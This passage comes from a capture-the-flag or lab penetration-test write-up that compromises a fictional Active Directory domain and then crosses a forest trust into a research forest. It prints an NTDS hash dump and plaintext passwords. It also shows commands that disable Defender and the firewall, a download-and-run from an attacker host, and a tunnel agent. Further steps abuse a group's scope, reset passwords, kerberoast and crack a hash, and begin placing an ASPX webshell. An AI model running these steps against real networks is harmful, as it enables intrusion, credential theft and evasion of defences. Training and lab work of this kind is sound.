nxc smb dc.westbridge.hsm -k --use-kcache --ntds

SMB         dc.westbridge.hsm 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         dc.westbridge.hsm 445    DC               [+] WESTBRIDGE.HSM\administrator from ccache (Pwn3d!)
SMB         dc.westbridge.hsm 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.westbridge.hsm 445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:23f398d3fa12625a1dab8a2c19cdd96b:::
SMB         dc.westbridge.hsm 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.westbridge.hsm 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1cee08cdd3d89d81ddfea7d2449a5f87:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\m.thompson:1103:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\r.anderson:1104:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.wilson:1105:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\d.parker:1106:aad3b435b51404eeaad3b435b51404ee:da953882db59522e02821ebcb9e37bd5:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\s.harrison:1107:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_legacy:9458:aad3b435b51404eeaad3b435b51404ee:f7c14b8b4a2d4358441e21d157f79fc1:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_mssql:9459:aad3b435b51404eeaad3b435b51404ee:025d7fd412286bef880ba432685d6d8f:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\o.carter:9476:aad3b435b51404eeaad3b435b51404ee:4fe695535e4077637affec319ec8d3da:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\n.brooks:9477:aad3b435b51404eeaad3b435b51404ee:3669aa3805a86b130d16faee8744ab1f:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\e.foster:9478:aad3b435b51404eeaad3b435b51404ee:dc3f51f1bcca763a40d6a106a2de8903:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\l.reed:9479:aad3b435b51404eeaad3b435b51404ee:672efd680f2778d87bfeff76ab7fd2a2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.ward:9480:aad3b435b51404eeaad3b435b51404ee:4b28739648299231012dd307f3e6f930:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.price:9481:aad3b435b51404eeaad3b435b51404ee:56d0bb9851055d17319709b1cb4b76c8:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\d.murphy:9482:aad3b435b51404eeaad3b435b51404ee:9a6d0e7d896b2c08d5858b57ab726904:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\l.cole:9483:aad3b435b51404eeaad3b435b51404ee:ce2c950b771a2e4cab88bdfd1703b291:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\o.griffin:9484:aad3b435b51404eeaad3b435b51404ee:2dc6975169d4a44ce3b2c74b2c5d7b4b:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\h.powell:9485:aad3b435b51404eeaad3b435b51404ee:5ac6af3ee3444d40993290021c190974:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\i.bishop:9486:aad3b435b51404eeaad3b435b51404ee:3011d7703ecde82a688fac9c852d4833:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.hayes:9487:aad3b435b51404eeaad3b435b51404ee:32b6f91155ea1a2f002a7443fa65ad73:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\j.walsh:9488:aad3b435b51404eeaad3b435b51404ee:ac93d1dc286887e281ccbb34705778f7:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\p.sullivan:9489:aad3b435b51404eeaad3b435b51404ee:62713727a3981c8b9192212b6de1428c:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\t.russell:9490:aad3b435b51404eeaad3b435b51404ee:1552ea69efde16390cf11f7486a58bb6:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.anderson:9494:aad3b435b51404eeaad3b435b51404ee:b4e751638569d552ceab27133e249044:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\b.wellington:9495:aad3b435b51404eeaad3b435b51404ee:3796b4f1feb088aa16a30f03f5ca4cfe:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_files:9503:aad3b435b51404eeaad3b435b51404ee:0eb58f71ee3cd38f9e695b3270596a9f:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_web:9506:aad3b435b51404eeaad3b435b51404ee:bec064a5c94d5725f737260d815d97d7:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_krb_t2:9508:aad3b435b51404eeaad3b435b51404ee:8bd7ff5bf2b9c11fcd54377575887b1d:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.pherson:9509:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\j.dillon:9510:aad3b435b51404eeaad3b435b51404ee:8bd7ff5bf2b9c11fcd54377575887b1d:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\t.dixon:9511:aad3b435b51404eeaad3b435b51404ee:e02831e354d2c33a4c760d947a11431d:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.collins:9512:aad3b435b51404eeaad3b435b51404ee:071d882abec2bae4f6589da7cc799503:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\d.hoff:9514:aad3b435b51404eeaad3b435b51404ee:e46f553a54dbe496ae984449956b1a07:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\b.jones:9515:aad3b435b51404eeaad3b435b51404ee:c0b491d9e1c67a532248b50863646dfc:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.owen:9516:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\researchoperator:9519:aad3b435b51404eeaad3b435b51404ee:dbf9e64c209385f4688eaa202f9a4ff5:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_webmonitor:9521:aad3b435b51404eeaad3b435b51404ee:64bc4335cee71420e11bc2eb8dc09396:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\j.bennett:10606:aad3b435b51404eeaad3b435b51404ee:dfedefef8a91e3f768d240c34962c633:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\s.adams:10608:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
SMB         dc.westbridge.hsm 445    DC               root:11601:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:e841cefed4552f68d7a4458e57136386:::
SMB         dc.westbridge.hsm 445    DC               SQL$:9460:aad3b435b51404eeaad3b435b51404ee:f39f4ffb344e31bd81a93854f655f63f:::
SMB         dc.westbridge.hsm 445    DC               FILES$:9499:aad3b435b51404eeaad3b435b51404ee:417d6bcf87929bfcd9561833bbebbd50:::
SMB         dc.westbridge.hsm 445    DC               WEB$:9504:aad3b435b51404eeaad3b435b51404ee:793e12284a4b809a990aa06279092164:::
SMB         dc.westbridge.hsm 445    DC               HELPDESK-WS$:10610:aad3b435b51404eeaad3b435b51404ee:6106732e6b84141c144b81ddc105a27e:::
SMB         dc.westbridge.hsm 445    DC               WBRESEARCH$:9518:aad3b435b51404eeaad3b435b51404ee:59ee991a9ac8f54e35810d04eff8d1ab:::
SMB         dc.westbridge.hsm 445    DC               [+] Dumped 48 NTDS hashes to /home/deus/.nxc/logs/ntds/DC_dc.westbridge.hsm_2026-08-23_202734.ntds of which 42 were added to the database
```

Three details in this dump are worth their weight:

* **`j.dillon` at RID 9510** — the "hidden account" from [Section 8.4](#84-non-default-acl-edges), finally resolved by cryptographic evidence rather than inference. Its restored peers `t.dixon` (9511) and `a.collins` (9512) sit right next to it in RID order.
* **`root` at RID 11601** — our own creation from [Section 14.3](#145-kerberos-as-the-privilege-escalation). The AD user we minted to pivot into Linux root now lives permanently in the NTDS. In a real engagement, this is an IoC you must clean up; here, it's just a receipt of our work.
* **`WBRESEARCH$` at RID 9518** — the inter-realm trust account sitting inside this domain's NTDS. Its secret is the shared key both KDCs use to encrypt cross-realm referrals—file this away for [Section 18.3](#184-cross-realm-tickets--how-the-trust-actually-works) and [Section 19.6](#196-s4u-as-administrator-dcsync-flag07).

And, of course, the dump yields the home forest's `krbtgt` hash — golden tickets for `westbridge.hsm` are mintable on demand from here on out.

---

# 18. Crossing the Trust — WESTBRIDGE-RESEARCH.HSM

## 18.1 The Paper Trail — Forest_Trust_Validation.eml

Two files were sitting on the DC Administrator's desktop, and both matter:

* **Database.kdb** — a KeePass vault (locked for now)
* **Forest_Trust_Validation.eml** — the validation memo for the trust itself

```bash
PS C:\Users\Administrator\Desktop> !download Database.kdb

PS C:\Users\Administrator\Desktop> !download Forest_Trust_Validation.eml
```

```bash
➜ cat Forest_Trust_Validation.eml
Hello,

As part of the validation of the recently established forest trust between WESTBRIDGE.HSM and WESTBRIDGE-RESEARCH.HSM, the researchoperator account in the WESTBRIDGE.HSM forest has been authorized to authenticate to the WESTBRIDGE-RESEARCH.HSM forest via the established cross-realm trust. The account has been designated as the owner of the Research Web Operations Global Security Group, which manages authorized operational access to the research web infrastructure.

Please note that the WESTBRIDGE-RESEARCH.HSM forest enforces Kerberos-only authentication for domain access. NTLM is disabled for domain authentication and LDAP access as part of the security baseline. Consequently, all domain logons, LDAP communication, and cross-forest authentication to the research forest must be performed using Kerberos.

The credentials required for the validation process are stored in the attached KeePass database.

KeePass Password: eJ6jSnz1z7T4chkJ

If you encounter any Kerberos, LDAP, or cross-forest authentication issues during testing, please notify the Infrastructure Services team.

Regards,

Administrator
WESTBRIDGE.HSM / WESTBRIDGE-RESEARCH.HSM
```

Four facts, straight from the org's own documentation:

1. **`researchoperator` is our bridge account** — explicitly authorized across the trust. Remember it? It's been sitting in every dump since the first LDAP pull, looking like an oddball. It's the *designated* door.
2. **It owns "Research Web Operations"** — the group controlling access to research web infrastructure. (This is the group from the support-portal chat!)
3. **NTLM is disabled in the research forest** — Kerberos only. That kills password-spray, relay, and every `-p 'pass'` habit. From here on: tickets or nothing (`-k`, ccache, `KRB5CCNAME` everywhere).
4. **The memo ships the vault's master password** — `eJ6jSnz1z7T4chkJ`. Opens `Database.kdb`. Cracking nothing, hashes nothing: the org handed us the keys in writing.

## 18.2 The KeePass Vault — Database.kdb

The vault is KDB 1.x (the legacy format used before KDBX 2/3/4). `kppy` reads it:

```bash
➜ python3 -m pip install kppy

➜ cat << 'EOF' > decrypt-kdb.py
import sys

try:
    # Updated class name for kppy legacy support
    from kppy.database import KPDBv1
except ImportError:
    print("Error: kppy library is missing or configured incorrectly.")
    sys.exit(1)

try:
    # Open legacy 1.x KDB format using KPDBv1
    db = KPDBv1(filepath='Database.kdb', password='eJ6jSnz1z7T4chkJ')
    db.load()

    print("Decryption Successful! Extracting entries:\n")
    print("=" * 60)

    for entry in db.entries:
        print(f"Group:    {entry.group}")
        print(f"Title:    {entry.title}")
        print(f"Username: {entry.username}")
        print(f"Password: {entry.password}")
        print("-" * 60)

except Exception as e:
    print(f"System Error: {e}")
EOF

➜ python3 decrypt-kdb.py
...[snip]...
------------------------------------------------------------
Group:    <kppy.groups.v1Group object at 0x7efe7ef19dc0>
Title:    researchoperator
Username: researchoperator
Password: XWkZ9o5T0c65djgYWl
------------------------------------------------------------
```

Of the twelve unique entries the vault contained, only one pays for what comes next: **`researchoperator : XWkZ9o5T0c65djgYWl`** — the cross-forest bridge account. Five of the other entries were credentials we already owned (alternatives to paths we didn't need) and six were already in the chain. The door into the research forest is `researchoperator`; everything from here on is building on it.

## 18.3 Network Pivot — Reaching 10.0.20.0/24

The research subnet isn't routable from our original `tun0` interface. With SYSTEM-equivalent execution on DC01, we can turn it into our router. Defender gets neutered first, an exclusion path is set for our tools, and the `ligolo-ng` agent drops:

```powershell
PS C:\Users\Administrator\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Users\Administrator\Documents> Add-MpPreference -ExclusionPath "C:\Programdata"
```

```powershell
PS C:\ProgramData> IEX(New-Object Net.WebClient).DownloadString("http://192.168.211.2/Get-PingSweep.ps1")

PS C:\ProgramData> Get-PingSweep -SubNet '10.0.20'

Address     Status RoundtripTime
-------     ------ -------------
10.0.20.5  Success             0
10.0.20.10 Success             1
```

Before reaching across the trust, we used `RunasCs.exe` to validate the credentials recovered from the Administrator's KeePass vault (`Database.kdb`). The Network logon (Type 3) authenticated cleanly, but since researchoperator held no useful local privileges, we stayed in our DC01 Administrator shell to execute the pivot.

```zsh
PS C:\ProgramData> !upload RunasCs.exe

PS C:\ProgramData> .\RunasCs.exe researchoperator XWkZ9o5T0c65djgYWl "whoami /priv" -l 3
...

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Two hosts on the research side: **10.0.20.5 (DC02)** and **10.0.20.10 (WEB — the research web server)**. Now route the tunnel through DC01:

```bash
# @@Attacker
➜ sudo ./proxy -selfcert
ligolo-ng » interface_create --name ligolo

# @@Victim | DC (WinRM session)
PS > certutil -urlcache -f -split http://192.168.211.2/agent.exe agent.exe
PS > .\agent.exe -connect 192.168.211.2:11601 -ignore-cert

# @@Attacker
ligolo-ng » session 1                      # pick the DC agent
ligolo-ng » add_route --name ligolo --route 10.0.20.0/24
ligolo-ng » start
```

> Why `ligolo-ng`? For the unfamiliar, Ligolo replaces `chisel` + `proxychains` by creating a virtual TUN interface on the attacker machine. Once the route is added, the kernel natively forwards all traffic through the TLS tunnel to the agent. Any tool (`nmap`, `nxc`, browsers) just works without proxy wrappers.

Operational Note: If your WinRM session dies mid-tunnel, the Ligolo agent can recover cleanly—but only if you drop the DC's firewall profiles first (`Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`). Otherwise, the Windows Firewall will silently eat the reconnects.

One host in the range didn't need that dance: SQL (`10.0.10.20`, the [Section 9.6](#96-system-on-sql) hop) had Defender installed but real-time protection never enabled — an admin oversight, not a design choice. Every other Windows box in the range (DC01, the research WEB server, and the research DC02) had it running and needed the explicit disable above before anything landed on disk.

With the tunnel up, `nmap` and `nxc` can hit the new subnet natively:

```zsh
➜ nmap -Pn -p 445 10.0.20.10
PORT    STATE SERVICE
445/tcp open  microsoft-ds

➜ nxc smb 10.0.20.0/24
SMB         10.0.20.10      445    WEB              [*] Windows 11 / Server 2025 Build 26100 x64 (name:WEB) (domain:westbridge-research.hsm) (signing:True) (SMBv1:False)
SMB         10.0.20.5       445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
```

DC02 prints as `NONE` because nxc's anonymous SMB bind was refused — the forest blocks null-session enumeration (consistent with the `.eml` note that NTLM is disabled for domain auth in `westbridge-research.hsm`), so it has no name or domain to display. WEB prints normally because null-auth *is* allowed there. (We'll get our shell on DC02 later via S4U — the AES256 key exfiltrated from research-WEB's LSA secrets impersonates Administrator against `cifs/DC02`, and that's where DA falls; full chain in [Section 19.6](#196-s4u-as-administrator-dcsync-flag07).)

## 18.4 Cross-Realm Tickets — How the Trust Actually Works

Update the `/etc/hosts` file and create a **dual-realm `krb5.conf`** so the system's native `libkrb5` knows how to resolve both KDCs:

```bash
# Update Hosts
10.0.20.5      DC02.westbridge-research.hsm westbridge-research.hsm DC02
10.0.20.10     WEB.westbridge-research.hsm WEB

# Update krb5 config
➜ cat <<EOF | sudo tee /tmp/krb5.conf
[libdefaults]
  default_realm = WESTBRIDGE.HSM
  dns_lookup_kdc = false
  dns_lookup_realm = false
  rdns = false

[realms]
  WESTBRIDGE.HSM = {
    kdc = dc.westbridge.hsm
  }

  WESTBRIDGE-RESEARCH.HSM = {
    kdc = dc02.westbridge-research.hsm
  }

[domain_realm]
  .westbridge.hsm = WESTBRIDGE.HSM
  westbridge.hsm = WESTBRIDGE.HSM

  .westbridge-research.hsm = WESTBRIDGE-RESEARCH.HSM
  westbridge-research.hsm = WESTBRIDGE-RESEARCH.HSM
EOF
```

Get a TGT at home, then ask for a service in the *other* forest:

```bash
➜ getTGT.py westbridge.hsm/researchoperator:'XWkZ9o5T0c65djgYWl' \
    -dc-ip 10.0.10.5

[*] Saving ticket in researchoperator.ccache
```

```bash
➜ klist researchoperator.ccache
Ticket cache: FILE:researchoperator.ccache
Default principal: researchoperator@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 21:20:36  08/24/2026 07:20:36  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:21:26  08/24/2026 07:20:36  ldap/dc.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
```

Two tickets in the cache so far: a home TGT and a service ticket for the home DC's LDAP. Then request a service ticket for a host *in the research realm* — the KDC negotiates the cross-realm hop transparently:

```bash
➜ env KRB5CCNAME=researchoperator.ccache \
kvno ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM

ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM: kvno = 4
```

```bash
➜ klist researchoperator.ccache
Ticket cache: FILE:researchoperator.ccache
Default principal: researchoperator@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 21:20:36  08/24/2026 07:20:36  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:21:26  08/24/2026 07:20:36  ldap/dc.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:28:54  08/24/2026 07:20:36  krbtgt/WESTBRIDGE-RESEARCH.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:28:55  08/24/2026 07:20:36  ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM
        renew until 08/24/2026 21:20:35
```

`klist` afterwards shows the magic — a **referral chain** landed in the cache:

```
krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM              🡐 home TGT
ldap/dc.westbridge.hsm@WESTBRIDGE.HSM             🡐 home service ticket
krbtgt/WESTBRIDGE-RESEARCH.HSM@WESTBRIDGE.HSM     🡐 ★ cross-realm referral ticket
ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM  🡐 research service ticket!
```

That third entry is the trust made visible: our home DC issued a TGT *for the remote realm*, encrypted with the inter-realm key both sides share (remember `WBRESEARCH$` from the NTDS dump? That trust account's secret *is* that key). The research KDC trusts anything its partner vouches for. No credentials ever crossed the wire — just signed referrals.

BloodHound collection works over this too — same ccache, fresh flags, no new password:

```bash
➜ env KRB5CCNAME=researchoperator.ccache \
rusthound-ce \
    -d westbridge-research.hsm -f dc02.westbridge-research.hsm -k \
    --zip -c All
```

**10 users, 2 computers** in the whole research forest. Tiny. And the graph connects exactly like the support-portal chat predicted.

## 18.5 Group Type Abuse — Ownership Is Not Permission

> Forest trusts are like bridges: highly convenient for administrators, and absolutely devastating when the toll booth is left unguarded. Time to ladder up some group scopes.

Recall the portal conversation ([Section 15.7](#157-looking-around--the-support-portal)): *"you need to change the group scope to Universal first, then to Domain Local."* Here's the full mechanics of what that chat was teaching, because this stage hides **two separate gotchas** — one about rights, one about scopes.

### 18.5.1 Owner ≠ Writable — Grant Yourself GenericAll First

BloodHound showed `researchoperator` with an **Owns** edge over `Research Web Operations`. Intuition says *owner = full control*, but AD is more subtle:

* **Ownership** grants exactly one implicit right: the ability to **modify the object's DACL** (and read it). That's it.
* It does **not** grant `WriteProperty`, `GenericAll`, or any attribute-write right. An owner of a locked-down object can't even rename it — until they exercise that one implicit right to hand themselves more.

So the first move converts ownership into actual writability — grant ourselves GenericAll using the very right ownership implies:

```bash
➜ env KRB5CCNAME=researchoperator.ccache \
bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' \
    -k ccache=researchoperator.ccache \
    add genericAll 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    'S-1-5-21-1978613116-3728955385-531918137-9519'

[+] S-1-5-21-1978613116-3728955385-531918137-9519 has now GenericAll on CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm
```

Only *now* can we touch the group's attributes.

### 18.5.2 The Scope Ladder — Global ➜ Universal ➜ Domain Local

The attribute that defines what a group *is* is **`groupType`** — one signed integer that encodes both the **scope** and whether the group is **security-enabled**. Decode it in hex:

```
-2147483646  =  0x80000002
                 │ │
                 │ └── 0x00000002 = GLOBAL_GROUP
                 └──── 0x80000000 = SECURITY_ENABLED   🡐 "actually usable for ACLs"
```

| Signed value | Hex | Meaning |
|---|---|---|
| `-2147483646` | `0x80000002` | security-enabled **Global** *(our starting state)* |
| `-2147483640` | `0x80000008` | security-enabled **Universal** |
| `-2147483644` | `0x80000004` | security-enabled **Domain Local** 🡐 accepts cross-domain members |

Our target is `-2147483644` (Domain Local) — cross-domain principals can only join Domain Local groups. But writing `-2147483644` directly onto a Global group bounces with `ERROR_NOT_SUPPORTED`: **AD refuses scope-jumps and forces the ladder**

```
Global ➜ Universal ➜ Domain Local          ✅ allowed path
Global ➜ Domain Local                      ❌ ERROR_NOT_SUPPORTED
```

(Why? Scope transitions have membership implications — going to Universal first lets AD re-validate existing members against forest-wide rules before the group becomes eligible for foreign principals.)

So: two writes, in order —

**Step 1 — Read the Baseline.**

```zsh
➜ env KRB5CCNAME=researchoperator.ccache \
bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' \
    -k ccache=researchoperator.ccache \
    get object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    --attr groupType --raw

distinguishedName: CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm
groupType: -2147483646
```

**Step 2 — Global ➜ Universal.**

First hop up the ladder:

```bash
➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' \
    -k ccache=researchoperator.ccache \
    set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    groupType -v '-2147483640'

[+] CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm's groupType has been updated
```

**Step 3 — Universal ➜ Domain Local.**

Now flip to the final scope:

```bash
➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' \
    -k ccache=researchoperator.ccache \
    set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    groupType -v '-2147483644'

[+] CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm's groupType has been updated
```

**Step 4 — Verify.**

Check the final state to confirm the write stuck:

```zsh
➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' \
    -k ccache=researchoperator.ccache \
    get object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    --attr groupType --raw

distinguishedName: CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm
groupType: -2147483644
```

### 18.5.3 Add the Foreign Member

Now the group accepts cross-domain principals. One subtlety when adding ourselves: **use the raw SID**, not the name:

```bash
➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' \
    -k ccache=researchoperator.ccache \
    add groupMember 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    'S-1-5-21-1978613116-3728955385-531918137-9519'

[+] S-1-5-21-1978613116-3728955385-531918137-9519 added to CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm
```

Why SID-form: `researchoperator` doesn't exist as an object in `westbridge-research.hsm` — there's nothing for a name lookup to resolve to. Cross-forest membership is tracked by SID; the account will materialize later under `CN=ForeignSecurityPrincipals` as `S-1-5-21-<home>-9519`.

One cleanup note from the run: after the scope surgery, `kdestroy` and pull a **fresh TGT** (`getTGT.py westbridge.hsm/researchoperator:'XWkZ9o5T0c65djgYWl'`) — group memberships ride inside the PAC of your tickets, so an old ticket still carries the *old* (groupless) PAC. Fresh TGT = new membership takes effect everywhere: `researchoperator@WESTBRIDGE.HSM` is now inside a research-forest security group which, per the trust memo, *"manages authorized operational access to the research web infrastructure."*

## 18.6 What the Research Graph Says

The fresh collection (10 users / 2 computers) lays out the remaining path in three hops:

| Fact | Consequence |
|---|---|
| **Research Web Operations can reset 3 accounts' passwords** | we own those resets now |
| One of the resettable users: **r.parker** — RDP **and** PowerShell Remoting on the research WEB server | shell on 10.0.20.10 |
| **t.walker** has GenericWrite over **j.bones** | shadow credential / password reset on j.bones |
| **j.bones** ∈ **Research Web Administrators** | admin-tier on the research web box |

Chain preview: `reset r.parker ➜ WinRM to WEB(10.0.20.10)`; `t.walker ➜ j.bones via shadow creds`; `j.bones ∈ Research Web Administrators`. All Kerberos, no passwords over the wire.

---

# 19. The Research Forest Falls

## 19.1 Password Resets ➜ Three Identities

With Research Web Operations membership in the PAC, the promised password resets are one bloodyAD call each:

```bash
➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
    -u 'researchoperator' \
    -k ccache=./researchoperator.ccache \
    set password 'r.parker' 'SecretMyth123!'

[+] Password changed successfully!
```

Then fresh TGTs for each new identity straight from DC02:

```bash
➜ getTGT.py westbridge-research.hsm/r.parker:'SecretMyth123!' \
    -dc-ip 10.0.20.5

➜ getTGT.py westbridge-research.hsm/t.walker:'SecretMyth123!' \
     -dc-ip 10.0.20.5
```

## 19.2 r.parker ➜ RDP onto the Research WEB Server

### 19.2.1 CredSSP Quirk — Don't Trust One Protocol

One detour first: nxc's RDP check *fails* for this account with `CredSSP - Server sent an error! Code: 0x80090302` even though the credential is valid — CredSSP negotiation quirk through the tunnel, not a wrong password. Don't trust a single protocol check; go straight at it:

```bash
➜ xfreerdp3 /v:web.westbridge-research.hsm /d:westbridge-research.hsm \
    /u:'r.parker' /p:'SecretMyth123!' /dynamic-resolution /sec:nla /cert:ignore +clipboard
```

![RDP session as r.parker](/assets/images/westbridge-rdp-rparker.png)

### 19.2.2 Local Admins — Why r.parker Was the Door

Local group enumeration confirms why this account was the door — it's a **direct member of the local Administrators** on WEB:

```
WEB\Administrator          Local
WBRESEARCH\r.parker        ActiveDirectory   🡐 local admin via direct membership
WBRESEARCH\Domain Admins   ActiveDirectory
```

## 19.3 j.bones — Targeted Kerberoast + Crack

### 19.3.1 Set SPN, Request, Clean Up — targetedkerberoast

The t.walker GenericWrite edge gets exercised with `targetedkerberoast` — it sets an SPN on j.bones on the fly, requests the TGS, and cleans up:

```bash
➜ env KRB5CCNAME=t.walker.ccache \
targetedkerberoast  \
    --dc-host dc02.westbridge-research.hsm -d 'westbridge-research.hsm' \
    -u 't.walker' -k

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (j.bones)
$krb5tgs$18$j.bones$WESTBRIDGE-RESEARCH.HSM$*westbridge-research.hsm/j.bones*$d1b40a564e4e4ef32fee8d4a$234f78419e6d044c560b9daf1155d01743c83045de534e5f3af71c10fc5483930f15186025a10db7fb78f7666e996e6c14768579af56520f450ac290d1b380e65f9043e8d3f53e65f787df53b97651774f6b...[snip]...b1db31983c0625897fafac77e8eb34b4d843abb6d0840098d8
```

### 19.3.2 Crack the hash

```bash
➜ hashcat --identify /tmp/hash.txt
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol

➜ hashcat -a 0 -m 19700 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1

$krb5tgs$18$j.bones$WESTBRIDGE-RESEARCH.HSM$d1b40a564e4e4ef32fee8d4a$234f78419e6d044c560b9daf1155d01743c830
...[snip]...7e8eb34b4d843abb6d0840098d8:8brokenbones8
```

### 19.3.3 Verify — runas from the r.parker RDP

(`runas /user:WBRESEARCH\j.bones` from the r.parker RDP session confirms the identity works.)

![RDP shell as j.bones](/assets/images/westbridge-rdp-jbones.png)

---

## 19.4 Webshell ➜ CrystalPotato ➜ SYSTEM

### 19.4.1 ASPX Webshell via Ligolo Tunnel — iis apppool\defaultapppool

While `j.bones` belongs to Research Web Administrators, IIS still executes web code under the restricted context of iis apppool\defaultapppool. To escalate, we need to drop an ASPX webshell into `C:\inetpub\wwwroot`.

This is where Ligolo’s `listener_add` feature shines. Instead of configuring complex reverse port forwards across the trust boundary, we command the DC agent (`10.0.10.5`) to open a local listener on port 7777, which securely proxies traffic back to our attacker web server (`192.168.211.2:7777`). From the research web server's perspective, it is simply downloading a file from the local domain controller.

Start the listener on the ligolo session, host the file on the attacker machine, and pull it down via PowerShell:

```zsh
ligolo-ng » listener_add --tcp --to 192.168.211.2:7777 --addr 0.0.0.0:7777
INFO[11867] Listener 2 created on remote agent!

➜ python3 -m http.server 7777
```

```powershell
PS C:\Windows\system32> cd c:\inetpub\wwwroot
